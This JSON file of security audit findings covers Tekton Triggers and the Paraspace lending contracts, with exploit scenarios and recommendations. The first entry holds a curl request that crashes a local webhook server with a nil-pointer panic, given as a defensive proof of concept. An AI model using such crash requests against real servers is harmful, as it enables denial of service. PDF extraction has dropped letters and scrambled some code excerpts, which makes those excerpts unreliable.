        "description": "The Process functions, which are responsible for executing the various triggers for the git, gitlab, bitbucket, and cel interceptors, do not properly validate request objects, leading to nil dereference panics when requests are submitted without a Context object. func (w *Interceptor) Process(ctx context.Context, r *triggersv1.InterceptorRequest) *triggersv1.InterceptorResponse { headers := interceptors.Canonical(r.Header) // (...) // Next validate secrets if p.SecretRef != nil { // Check the secret to see if it is empty if p.SecretRef.SecretKey == \"\" { interceptor secretRef.secretKey is empty\") return interceptors.Fail(codes.FailedPrecondition, \"github } // (...) ns, _ := triggersv1.ParseTriggerID(r.Context.TriggerID) Figure 13.1: triggers/pkg/interceptors/github/github.go#L48-L85 We tested the panic by forwarding the Tekton Triggers webhook server to localhost and sending HTTP requests to the GitHub endpoint. The Go HTTP server recovers from the panic. curl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:1934' -H $'Content-Length: 178' \\ --data-binary $'{\\x0d\\x0a\\\"header\\\":{\\x0d\\x0a\\\"X-Hub-Signature\\\":[\\x0d\\x0a\\x09\\\"sig\\\"\\x0d\\x0a],\\x0 d\\x0a\\\"X-GitHub-Event\\\":[\\x0d\\x0a\\\"evil\\\"\\x0d\\x0a]\\x0d\\x0a},\\x0d\\x0a\\\"interceptor_pa rams\\\": {\\x0d\\x0a\\x09\\\"secretRef\\\": {\\x0d\\x0a\\x09\\x09\\\"secretKey\\\":\\\"key\\\",\\x0d\\x0a\\x09\\x09\\\"secretName\\\":\\\"name\\\"\\x0d\\x 0a\\x09}\\x0d\\x0a}\\x0d\\x0a}' \\ $'http://127.0.0.1:1934/github' Figure 13.2: The curl request that causes a panic 2022/03/08 05:34:13 http: panic serving 127.0.0.1:49304: runtime error: invalid memory address or nil pointer dereference goroutine 33372 [running]: net/http.(*conn).serve.func1(0xc0001bf0e0) net/http/server.go:1824 +0x153 panic(0x1c25340, 0x30d6060) runtime/panic.go:971 +0x499 github.com/tektoncd/triggers/pkg/interceptors/github.(*Interceptor).Process(0xc00000 d248, 0x216fec8, 0xc0003d5020, 0xc0002b7b60, 0xc0000a7978) github.com/tektoncd/triggers/pkg/interceptors/github/github.go:85 +0x1f5 github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ExecuteInterceptor(0x c000491490, 0xc000280200, 0x0, 0x0, 0x0, 0x0, 0x0) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:128 +0x5df github.com/tektoncd/triggers/pkg/interceptors/server.(*Server).ServeHTTP(0xc00049149 0, 0x2166dc0, 0xc0000d42a0, 0xc000280200) github.com/tektoncd/triggers/pkg/interceptors/server/server.go:57 +0x4d net/http.(*ServeMux).ServeHTTP(0xc00042d000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2448 +0x1ad net/http.serverHandler.ServeHTTP(0xc0000d4000, 0x2166dc0, 0xc0000d42a0, 0xc000280200) net/http/server.go:2887 +0xa3 net/http.(*conn).serve(0xc0001bf0e0, 0x216ff00, 0xc00042d200) net/http/server.go:1952 +0x8cd created by net/http.(*Server).Serve net/http/server.go:3013 +0x39b Figure 13.3: Panic trace Exploit Scenario As the codebase continues to grow, a new mechanism is added to call one of the Process functions without relying on HTTP requests (for instance, via a custom RPC client implementation). An attacker uses this mechanism to create a new interceptor. He calls the Process function with an invalid object, causing a panic that crashes the Tekton Triggers webhook server. Recommendations Short term, add checks to verify that request Context objects are not nil before dereferencing them. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "1. Unconventional test structure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "Aspects of the Paraspace tests make them dicult to run. Tests that are dicult to run are less likely to be run. First, the Paraspace tests are congured to initialize all tests before any single test can be run. Therefore, even simple tests incur the initialization costs of the most expensive tests. Such a design hinders development. Figure 1.1 shows the rst 25 lines that are output during test initialization. Approximately 270 lines are output before the rst test is run. As shown in the gure, several ERC20 and ERC721 tokens are deployed during initialization. These steps are unnecessary in many testing situations, such as if a user wants to run a test that does not involve these tokens. - Environment - Network : hardhat -> Deploying test environment... ------------ step 00 done ------------ deploying now DAI deploying now WETH deploying now USDC deploying now USDT deploying now WBTC deploying now stETH deploying now APE deploying now aWETH deploying now cETH deploying now PUNK ------------ step 0A done ------------ deploying now WPUNKS deploying now BAYC deploying now MAYC deploying now DOODLE deploying now AZUKI deploying now CLONEX deploying now MOONBIRD deploying now MEEBITS deploying now OTHR deploying now UniswapV3 ... Figure 1.1: The rst 25 lines emitted by Paraspace tests Second, the paraspace-core repository uses the paraspace-deploy repository as a Git submodule and relies on it when being built and tested. However, while the former is public, the latter is private. Therefore, paraspace-core can be built or tested only by those with access to paraspace-deploy. Finally, some tests use nested it calls (gure 1.2), which are not supported by Mocha. it(\"deposited aWETH should have balance multiplied by rebasing index\", async () => { ... it(\"should be able to supply aWETH and mint rebasing PToken\", async () => { ... }); it(\"expect the scaled balance to be the principal balance multiplied by Aave pool liquidity index divided by RAY (2^27)\", async () => { ... }); }); Figure 1.2: test-suites/rebasing.spec.ts#L125L165 Developers should strive to implement testing that thoroughly covers the project and tests against both bad and expected inputs. Having robust unit and integration tests can greatly increase both developers and users condence in the codes functionality. However, tests cannot benet the system if they are not actually run. Therefore, tests should be made as easy to run as possible. Exploit Scenario Alice, a Paraspace developer, develops fewer tests than she otherwise would because she is frustrated by the time required to run the tests. Paraspaces test coverage suers as a result. Recommendations Short term, take the following steps:  Adopt a more tailored testing solution that deploys only the resources needed to run any given test.  Either make the paraspace-deploy repository public or eliminate paraspace-cores reliance on paraspace-deploy.  Rewrite the tests in rebasing.spec.ts to eliminate the nested it calls. Making tests easier to run will help ensure that they are actually run. Long term, consider timing individual tests in the continuous integration process. Doing so will help to identify tests with extreme resource requirements. References  Pull request #4525 in mochajs/mocha: Throw on nested it call  Stack Overow: Mocha test case - are nested it( ) functions kosher? 2. Insu\u0000cient event generation Severity: Low Diculty: Low Type: Auditing and Logging Finding ID: TOB-PARASPACE-2 Target: Various targets",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Missing supportsInterface functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "According to EIP-165, a contracts implementation of the supportsInterface function should return true for the interfaces that the contract supports. Outside of the dependencies and mocks directories, only one Paraspace contract has a supportsInterface function. For example, each of the following contracts includes an onERC721Received function; therefore, they should have a supportsInterface function that returns true for the ERC721TokenReceiver interface ( PoolCores onERC721Received implementation appears in gure 3.1):  contracts/ui/MoonBirdsGateway.sol  contracts/ui/UniswapV3Gateway.sol  contracts/ui/WPunkGateway.sol  contracts/protocol/tokenization/NToken.sol  contracts/protocol/tokenization/NTokenUniswapV3.sol  contracts/protocol/tokenization/NTokenMoonBirds.sol  contracts/protocol/pool/PoolCore.sol // This function is necessary when receive erc721 from looksrare function onERC721Received( address, address, uint256, bytes memory ) external virtual returns (bytes4) { return this.onERC721Received.selector; } Figure 3.1: contracts/protocol/pool/PoolCore.sol#L773L781 Exploit Scenario Alices contract tries to send an ERC721 token to a PoolCore contract. Alices contract rst tries to determine whether the PoolCore contract supports the ERC721TokenReceiver interface by calling supportsInterface. When the call reverts, Alices contract aborts the transfer. Recommendations Short term, add supportsInterface functions to all contracts that implement a well-known interface. Doing so will help to ensure that Paraspace contracts can interact with external contracts. Long term, add tests to ensure that each contracts supportsInterface function returns true for the interfaces that the contract supports and false for some subset of the interfaces that the contract does not support. Doing so will help to ensure that the supportsInterface functions work correctly. References  EIP-165: Standard Interface Detection  EIP-721: Non-Fungible Token Standard",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. ERC1155 asset type is dened but not implemented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The asset type ERC1155 is dened in DataTypes.sol but is not otherwise supported. Having an unsupported variant in the code is risky, as developers could use it accidentally. The AssetType declaration appears in gure 4.1. It consists of three variants, one of which is ERC1155. However, ERC1155 does not appear anywhere else in the code. For example, it does not appear in the executeRescueTokens function in the PoolLogic.sol contract (gure 4.2), meaning it is not possible to rescue ERC1155 tokens. enum AssetType { ERC20, ERC721, ERC1155 } Figure 4.1: contracts/protocol/libraries/types/DataTypes.sol#L7L11 function executeRescueTokens( DataTypes.AssetType assetType, address token, address to, uint256 amountOrTokenId ) external { if (assetType == DataTypes.AssetType.ERC20) { IERC20(token).safeTransfer(to, amountOrTokenId); } else if (assetType == DataTypes.AssetType.ERC721) { IERC721(token).safeTransferFrom(address(this), to, amountOrTokenId); } } Figure 4.2: contracts/protocol/libraries/logic/PoolLogic.sol#L80L91 Exploit Scenario Alice, a Paraspace developer, writes code that uses the ERC1155 asset type. Because the asset type is not implemented, Alices code does not work correctly. Recommendations Short term, remove ERC1155 from AssetType. Doing so will eliminate the possibility that a developer will use it accidentally. Long term, if the ERC1155 asset type is re-enabled, thoroughly test all code using it. Regularly review all conditionals involving asset types (e.g., as in gure 4.2) to verify that they handle all applicable asset types correctly. Taking these steps will help to ensure that the code works properly following the incorporation of ERC1155 assets.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. executeMintToTreasury silently skips non-ERC20 tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The executeMintToTreasury function silently ignores non-ERC20 assets passed to it. Such behavior could allow erroneous calls to executeMintToTreasury to go unnoticed. The code for executeMintToTreasury appears in gure 5.1. It is called from the mintToTreasury function in PoolParameters.sol (gure 5.2). As shown in gure 5.1, non-ERC20 assets are silently skipped. function executeMintToTreasury( mapping(address => DataTypes.ReserveData) storage reservesData, address[] calldata assets ) external { for (uint256 i = 0; i < assets.length; i++) { address assetAddress = assets[i]; DataTypes.ReserveData storage reserve = reservesData[assetAddress]; DataTypes.ReserveConfigurationMap memory reserveConfiguration = reserve.configuration; // this cover both inactive reserves and invalid reserves since the flag will be 0 for both !reserveConfiguration.getActive() || reserveConfiguration.getAssetType() != DataTypes.AssetType.ERC20 continue; if ( ) { } ... } } Figure 5.1: contracts/protocol/libraries/logic/PoolLogic.sol#L98L134 function mintToTreasury(address[] calldata assets) external virtual override nonReentrant { } PoolLogic.executeMintToTreasury(_reserves, assets); Figure 5.2: contracts/protocol/pool/PoolParameters.sol#L97L104 Note that because this is a minting operation, it likely meant to be called by an administrator. However, an administrator could pass a non-ERC20 asset in error. Because the function silently skips such assets, the error could go unnoticed. Exploit Scenario Alice, a Paraspace administrator, calls mintToTreasury with an array of assets. Alice accidentally sets one array element to an ERC721 asset. Alices mistake is silently ignored by the on-chain code, and no error is reported. Recommendations Short term, have executeMintToTreasury revert when a non-ERC20 asset is passed to it. Doing so will ensure that callers are alerted to such errors. Long term, regularly review all conditionals involving asset types to verify that they handle all applicable asset types correctly. Doing so will help to identify problems involving the handling of dierent asset types.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. getReservesData does not set all AggregatedReserveData elds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The getReservesData function lls in an AggregatedReserveData structure for the reserve handled by an IPoolAddressesProvider. However, the function does not set the structures name and assetType elds. Therefore, o-chain code relying on this function will see uninitialized data. Part of the AggregatedReserveData structure appears in gure 6.1. The complete structure consists of 53 elds. Each iteration of the loop in getReservesData (gure 6.2) lls in the elds of one AggregatedReserveData structure. However, the loop does not set the structures name elds. And although reserve assetTypes are computed, they are never stored in the structure. struct AggregatedReserveData { address underlyingAsset; string name; string symbol; ... //AssetType DataTypes.AssetType assetType; } Figure 6.1: contracts/ui/interfaces/IUiPoolDataProvider.sol#L18L78 function getReservesData(IPoolAddressesProvider provider) public view override returns (AggregatedReserveData[] memory, BaseCurrencyInfo memory) { IParaSpaceOracle oracle = IParaSpaceOracle(provider.getPriceOracle()); IPool pool = IPool(provider.getPool()); address[] memory reserves = pool.getReservesList(); AggregatedReserveData[] memory reservesData = new AggregatedReserveData[](reserves.length); for (uint256 i = 0; i < reserves.length; i++) { ... DataTypes.AssetType assetType; ( reserveData.isActive, reserveData.isFrozen, reserveData.borrowingEnabled, reserveData.stableBorrowRateEnabled, isPaused, assetType ) = reserveConfigurationMap.getFlags(); ... } ... return (reservesData, baseCurrencyInfo); } Figure 6.2: contracts/ui/UiPoolDataProvider.sol#L83L269 Exploit Scenario Alice writes o-chain code that calls getReservesData. Alices code treats the returned name and assetType elds as if they have been properly lled in. Because these elds have not been set, Alices code behaves incorrectly (e.g., by trying to transfer ERC721 tokens as though they were ERC20 tokens). Recommendations Short term, adjust getReservesData so that it sets the name and assetType elds. Doing so will help prevent o-chain code from receiving uninitialized data. Long term, test code that is meant to be called from o-chain to verify that every returned eld is set. Doing so can help to catch bugs like this one.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Excessive type repetition in returned tuples ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "Several functions return tuples that contain many elds of the same type adjacent to one another. Such a practice is error-prone, as callers could easily confuse the elds. An example appears in gure 7.1. The tuple returned by the calculateUserAccountData function contains nine elds of type uint256 adjacent to each other. An example in which the function is called appears in gure 7.2. As the gure makes evident, a misplaced comma, indicating that the caller identied the wrong eld holding the data of interest, could have disastrous consequences. /** * @notice Calculates the user data across the reserves. * @dev It includes the total liquidity/collateral/borrow balances in the base currency used by the price feed, * the average Loan To Value, the average Liquidation Ratio, and the Health factor. * @param reservesData The state of all the reserves * @param reservesList The addresses of all the active reserves * @param params Additional parameters needed for the calculation * @return The total collateral of the user in the base currency used by the price feed * @return The total ERC721 collateral of the user in the base currency used by the price feed * @return The total debt of the user in the base currency used by the price feed * @return The average ltv of the user * @return The average liquidation threshold of the user * @return The health factor of the user * @return True if the ltv is zero, false otherwise **/ function calculateUserAccountData( mapping(address => DataTypes.ReserveData) storage reservesData, mapping(uint256 => address) storage reservesList, DataTypes.CalculateUserAccountDataParams memory params ) internal view returns ( uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256, bool ) { ... return ( vars.totalCollateralInBaseCurrency, vars.totalERC721CollateralInBaseCurrency, vars.totalDebtInBaseCurrency, vars.avgLtv, vars.avgLiquidationThreshold, vars.avgERC721LiquidationThreshold, vars.payableDebtByERC20Assets, vars.healthFactor, vars.erc721HealthFactor, vars.hasZeroLtvCollateral ); Figure 7.1: contracts/protocol/libraries/logic/GenericLogic.sol#L58L302 } ( vars.userGlobalCollateralBalance, , vars.userGlobalTotalDebt, , , , , , vars.healthFactor, ) = GenericLogic.calculateUserAccountData( Figure 7.2: contracts/protocol/libraries/logic/LiquidationLogic.sol#L393L404 Also, note that the documentation of calculateUserAccountData does not accurately reect the implementation. The documentation describes only six returned uint256 elds (highlighted in yellow in gure 7.1). In reality, the function returns an additional three (highlighted in red in gure 7.1). Less extreme but similar examples of adjacent eld types in tuples appear in gures 7.3 and 7.4. function getFlags(DataTypes.ReserveConfigurationMap memory self) internal pure returns ( bool, bool, bool, bool, bool, DataTypes.AssetType ) Figure 7.3: contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L516 L526 function getParams(DataTypes.ReserveConfigurationMap memory self) internal pure returns ( uint256, uint256, uint256, uint256, uint256, bool ) Figure 7.4: contracts/protocol/libraries/configuration/ReserveConfiguration.sol#L552 L562 Exploit Scenario Alice, a Paraspace developer, writes code that calls calculateUserAccountData. Alice misplaces a comma, causing the health factor to be interpreted as the ERC721 health factor. Alices code behaves incorrectly as a result. Recommendations Short term, take the following steps:  Choose a threshold for adjacent elds of the same type in tuples (e.g., four). Wherever functions return tuples containing a number of adjacent elds of the same type greater than that threshold, have the functions return structs instead. Returning a struct instead of a tuple will reduce the likelihood that a caller will confuse the returned values.  Correct the documentation in gure 7.1. Doing so will reduce the likelihood that calculateUserAccountData is miscalled. Long term, as new functions are added to the codebase, ensure that they respect the threshold chosen in implementing the short-term recommendation. Doing so will help to ensure that values returned from the new functions are not misinterpreted.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Incorrect grace period could result in denial of service ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The PriceOracleSentinel contracts isBorrowAllowed and isLiquidationAllowed functions return true only if a grace period has elapsed since the oracles last update. Setting the grace period parameter too high could result in a denial-of-service condition. The relevant code appears in gure 8.1. Both isBorrowAllowed and isLiquidationAllowed call _isUpAndGracePeriodPassed, which checks whether block.timestamp minus lastUpdateTimestamp is greater than _gracePeriod. /// @inheritdoc IPriceOracleSentinel function isBorrowAllowed() external view override returns (bool) { return _isUpAndGracePeriodPassed(); } /// @inheritdoc IPriceOracleSentinel function isLiquidationAllowed() external view override returns (bool) { return _isUpAndGracePeriodPassed(); } /** * @notice Checks the sequencer oracle is healthy: is up and grace period passed. * @return True if the SequencerOracle is up and the grace period passed, false otherwise */ function _isUpAndGracePeriodPassed() internal view returns (bool) { (, int256 answer, , uint256 lastUpdateTimestamp, ) = _sequencerOracle .latestRoundData(); return answer == 0 && block.timestamp - lastUpdateTimestamp > _gracePeriod; } Figure 8.1: contracts/protocol/configuration/PriceOracleSentinel.sol#L69L88 Suppose block.timestamp minus lastUpdateTimestamp is never more than N seconds. Consequently, setting _gracePeriod to N or greater would mean that isBorrowAllowed and isLiquidationAllowed never return true. The code in gure 8.1 resembles some example code from the Chainlink documentation. However, in that example code, the grace period is relative to when the round started, not when the round was updated. Exploit Scenario Alice, a Paraspace administrator, accidentally sets the grace period to higher than the interval at which rounds are updated. Borrowing and liquidation operations are eectively disabled as a result. Recommendations Short term, either have the grace period start from a rounds startedAt time, or consider removing the grace period entirely. Doing so will eliminate a potential denial-of-service condition. Long term, monitor Chainlink oracles behavior to determine long-term trends. Doing so will help in determining safe parameter choices.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Incorrect accounting in _transferCollaterizable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The _transferCollaterizable function mishandles the collaterizedBalance and _isUsedAsCollateral elds. At a minimum, this means that transferred tokens cannot be used as collateral. The code for _transferCollaterizable appears in gure 9.1. It is called from Ntoken._transfer (gure 9.2). The code decreases _userState[from].collaterizedBalance and clears _isUsedAsCollateral[tokenId]. However, the code does not make any corresponding changes, such as increasing _userState[to].collaterizedBalance and setting _isUsedAsCollateral[tokenId] elsewhere. As a result, if Alice transfers her NToken to Bob, Bob will not be able to use the corresponding ERC721 token as collateral. function _transferCollaterizable( address from, address to, uint256 tokenId ) internal virtual returns (bool isUsedAsCollateral_) { isUsedAsCollateral_ = _isUsedAsCollateral[tokenId]; if (from != to && isUsedAsCollateral_) { _userState[from].collaterizedBalance -= 1; delete _isUsedAsCollateral[tokenId]; } MintableIncentivizedERC721._transfer(from, to, tokenId); } Figure 9.1: contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L643 L656 function _transfer( address from, address to, uint256 tokenId, bool validate ) internal { address underlyingAsset = _underlyingAsset; uint256 fromBalanceBefore = collaterizedBalanceOf(from); uint256 toBalanceBefore = collaterizedBalanceOf(to); bool isUsedAsCollateral = _transferCollaterizable(from, to, tokenId); ... } Figure 9.2: contracts/protocol/tokenization/NToken.sol#L300L324 The code used to verify the bug appears in gure 9.3. The code rst veries that the collaterizedBalance and _isUsedAsCollateral elds are set correctly. It then has User 1 send his or her token to User 2, who sends it back to User 1. Finally, it veries that the collaterizedBalance and _isUsedAsCollateral elds are set incorrectly. Most subsequent tests fail thereafter. it(\"User 1 sends the nToken to User 2, who sends it back to User 1\", async () => { const { nBAYC, users: [user1, user2], } = testEnv; expect(await nBAYC.isUsedAsCollateral(0)).to.be.equal(true); expect(await nBAYC.collaterizedBalanceOf(user1.address)).to.be.equal(1); expect(await nBAYC.collaterizedBalanceOf(user2.address)).to.be.equal(0); await nBAYC.connect(user1.signer).transferFrom(user1.address, user2.address, 0); await nBAYC.connect(user2.signer).transferFrom(user2.address, user1.address, 0); expect(await nBAYC.isUsedAsCollateral(0)).to.be.equal(false); expect(await nBAYC.collaterizedBalanceOf(user1.address)).to.be.equal(0); expect(await nBAYC.collaterizedBalanceOf(user2.address)).to.be.equal(0); }); it(\"User 2 deposits 10k DAI and User 1 borrows 8K DAI\", async () => { Figure 9.3: This is the code used to verify the bug. The highlighted line appears in the ntoken.spec.ts le. What precedes it was added to that le. Exploit Scenario Alice, a Paraspace user, maintains several accounts. Alice transfers an NToken from one of her accounts to another. She tries to borrow against the NTokens corresponding ERC721 token but is unable to. Alice misses a nancial opportunity while trying to determine the source of the error. Recommendations Short term, implement one of the following two options:  Correct the accounting errors in the code in gure 9.1. (We experimented with this but were not able to determine all of the necessary changes.) Correcting the accounting errors will help ensure that users observe predictable behavior regarding NTokens.  Disallow the transferring of assets that have been registered as collateral. If a user is to be surprised by her NTokens behavior, it is better that it happen sooner (when the user tries to transfer) than later (when the user tries to borrow). Long term, expand the tests in ntoken.spec.ts to include scenarios such as transferring NTokens among users. Including such tests could help to uncover similar bugs. Note that ntoken.spec.ts includes at least one broken test (gure 9.3). The token ID passed to nBAYC.transferFrom should be 0, not 1. Furthermore, the test checks for the wrong error message. It should be Health factor is lesser than the liquidation threshold, not ERC721: operator query for nonexistent token. it(\"User 1 tries to send the nToken to User 2 (should fail)\", async () => { const { nBAYC, users: [user1, user2], } = testEnv; await expect( nBAYC.connect(user1.signer).transferFrom(user1.address, user2.address, 1) ).to.be.revertedWith(\"ERC721: operator query for nonexistent token\"); }); Figure 9.4: test-suites/ntoken.spec.ts#L74L83",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. IPriceOracle interface is used only in tests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The IPriceOracle interface is used only in tests, yet it appears alongside production code. Its location increases the risk that a developer will try to use it in production code. The complete interface appears in gure 10.1. Note that the interface includes code that a real oracle is unlikely to include, such as the setAssetPrice function. Therefore, a developer that calls this function would likely introduce a bug into the code. // SPDX-License-Identifier: AGPL-3.0 pragma solidity 0.8.10; /** * @title IPriceOracle * * @notice Defines the basic interface for a Price oracle. **/ interface IPriceOracle { /** * @notice Returns the asset price in the base currency * @param asset The address of the asset * @return The price of the asset **/ function getAssetPrice(address asset) external view returns (uint256); /** * @notice Set the price of the asset * @param asset The address of the asset * @param price The price of the asset **/ function setAssetPrice(address asset, uint256 price) external; } Figure 10.1: contracts/interfaces/IPriceOracle.sol Exploit Scenario Alice, a Paraspace developer, uses the IPriceOracle interface in production code. Alices contract tries to call the setAssetPrice method. When the vulnerable code path is exercised, Alices contract reverts unexpectedly. Recommendations Short term, move IPriceOracle.sol to a location that makes it clear that it should be used in testing code only. Adjust all references to the le accordingly. Doing so will reduce the risk that the le is used in production code. Long term, as new code is added to the codebase, maintain segregation between production and testing code. Testing code is typically not held to the same standards as production code. Calling testing code from production code could introduce bugs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Manual ERC721 transfers could be claimed as NTokens by anyone ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "The PoolCore contract has an external function supplyERC721FromNToken, whose purpose is to validate that the given ERC721 assets are owned by the NToken contract and then to mint the corresponding NTokens to a caller-supplied address. We suspect that the intended use case for this function is that the NTokenMoonBirds or UniswapV3Gateway contract will transfer the ERC721 assets to the NToken contract and then immediately call supplyERC721FromNToken. However, the access controls on this function allow an unauthorized user to take ownership of any assets manually transferred to the NToken contract, for whatever reason that may be, as NToken does not track the original owner of the asset. function supplyERC721FromNToken( address asset, DataTypes.ERC721SupplyParams[] calldata tokenData, address onBehalfOf ) external virtual override nonReentrant { SupplyLogic.executeSupplyERC721FromNToken( // ... ); } Figure 11.1: The external supplyERC721FromNToken function within PoolCore function validateSupplyFromNToken( DataTypes.ReserveCache memory reserveCache, DataTypes.ExecuteSupplyERC721Params memory params, DataTypes.AssetType assetType ) internal view { // ... for (uint256 index = 0; index < amount; index++) { // validate that the owner of the underlying asset is the NToken contract require( IERC721(params.asset).ownerOf( params.tokenData[index].tokenId ) == reserveCache.xTokenAddress, Errors.NOT_THE_OWNER ); // validate that the owner of the ntoken that has the same tokenId is the zero address require( IERC721(reserveCache.xTokenAddress).ownerOf( params.tokenData[index].tokenId ) == address(0x0), Errors.NOT_THE_OWNER ); } } Figure 11.2: The validation checks performed by supplyERC721FromNToken function executeSupplyERC721Base( uint16 reserveId, address nTokenAddress, DataTypes.UserConfigurationMap storage userConfig, DataTypes.ExecuteSupplyERC721Params memory params ) internal { // ... bool isFirstCollaterarized = INToken(nTokenAddress).mint( params.onBehalfOf, params.tokenData ); // ... } Figure 11.3: The unauthorized minting operation Users regularly interact with the NToken contract, which represents ERC721 assets, so it is possible that a malicious actor could convince users to transfer their ERC721 assets to the contract in an unintended manner. Exploit Scenario Alice, an unaware owner of some ERC721 assets, is convinced to transfer her assets to the NToken contract (or transfers them on her own accord, unaware that she should not). A malicious third party mints NTokens from Alices assets and withdraws them to his own account. Recommendations Short term, document the purpose and use of the NToken contract to ensure that users are unambiguously aware that ERC721 tokens are not meant to be sent directly to the NToken contract. Long term, consider whether supplyERC721FromNToken should have more access controls around it. Additional access controls could prevent attackers from taking ownership of any incorrectly transferred asset. In particular, this function is called from only two locations, so a msg.sender whitelist could be sucient. Additionally, if possible, consider adding additional metadata to the contract to track the original owner of ERC721 assets, and consider providing a mechanism for transferring any asset without a corresponding NToken back to the original owner.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Inconsistent behavior between NToken and PToken liquidations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "When a user liquidates another users ERC20 tokens and opts to receive PTokens, the PTokens are automatically registered as collateral. However, when a user liquidates another users ERC721 token and opts to receive an NToken, the NToken is not automatically registered as collateral. This discrepancy could be confusing for users. The relevant code appears in gures 12.1 through 12.3. For ERC20 tokens, _liquidatePTokens is called, which in turns calls setUsingAsCollateral if the liquidator has not already designated the PTokens as collateral (gures 12.1 and 12.2). However, for an ERC721 token, the NToken is simply transferred (gure 12.3). if (params.receiveXToken) { _liquidatePTokens(usersConfig, collateralReserve, params, vars); } else { Figure 12.1: contracts/protocol/libraries/logic/LiquidationLogic.sol#L310L312 function _liquidatePTokens( mapping(address => DataTypes.UserConfigurationMap) storage usersConfig, DataTypes.ReserveData storage collateralReserve, DataTypes.ExecuteLiquidationCallParams memory params, LiquidationCallLocalVars memory vars ) internal { ... if (liquidatorPreviousPTokenBalance == 0) { DataTypes.UserConfigurationMap storage liquidatorConfig = usersConfig[vars.liquidator]; liquidatorConfig.setUsingAsCollateral(collateralReserve.id, true); emit ReserveUsedAsCollateralEnabled( params.collateralAsset, vars.liquidator ); } } Figure 12.2: contracts/protocol/libraries/logic/LiquidationLogic.sol#L667L693 if (params.receiveXToken) { INToken(vars.collateralXToken).transferOnLiquidation( params.user, vars.liquidator, params.collateralTokenId ); } else { Figure 12.3: contracts/protocol/libraries/logic/LiquidationLogic.sol#L562L568 Exploit Scenario Alice, a Paraspace user, liquidates several ERC721 tokens. Alice comes to expect that received NTokens are not designated as collateral. Eventually, Alice liquidates another users ERC20 tokens and opts to receive PTokens. Bob liquidates Alices PTokens, and Alice loses the underlying ERC20 tokens as a result. Recommendations Short term, conspicuously document the fact that PToken and NToken liquidations behave dierently. Doing so will reduce the likelihood that users will be surprised by the inconsistency. Long term, consider whether the behavior should be made consistent. That is, decide whether NTokens and PTokens should be automatically collateralized on liquidation, and implement such behavior for both types of tokens. A consistent API is less likely to be a source of errors.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Missing asset type checks in ValidationLogic library ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf",
        "description": "Some validation functions involving assets do not check the given assets type. Such checks should be added to ensure defense in depth. The validateRepay function is one example (gure 13.1). The function performs several checks involving the asset being repaid, but the function does not check that the asset is an ERC20 asset. function validateRepay( DataTypes.ReserveCache memory reserveCache, uint256 amountSent, DataTypes.InterestRateMode interestRateMode, address onBehalfOf, uint256 stableDebt, uint256 variableDebt ) internal view { ... (bool isActive, , , , bool isPaused, ) = reserveCache .reserveConfiguration .getFlags(); require(isActive, Errors.RESERVE_INACTIVE); require(!isPaused, Errors.RESERVE_PAUSED); ... } Figure 13.1: contracts/protocol/libraries/logic/ValidationLogic.sol#L403L447 Another example is the validateFlashloanSimple function, which does not check that the loaned asset is an ERC20 asset. We do not believe that the absence of these checks currently represents a vulnerability. However, adding these checks will help protect the code against future modications. Exploit Scenario Alice, a Paraspace developer, implements a feature allowing users to ash loan ERC721 tokens to other users in exchange for a fee. Alice uses the validateFlashloanSimple function as a template for implementing the new validation code. Therefore, Alices additions lack a check that the loaned assets are actually ERC721 assets. Some users lose ERC20 tokens as a result. Recommendations Short term, ensure that each validation function involving assets veries the type of the asset involved. Doing so will help protect the code against future modications. Long term, regularly review all conditionals involving asset types to verify that they handle all applicable asset types correctly. Doing so will help to identify problems involving the handling of dierent asset types.",
        "labels": [
            "Trail of Bits",
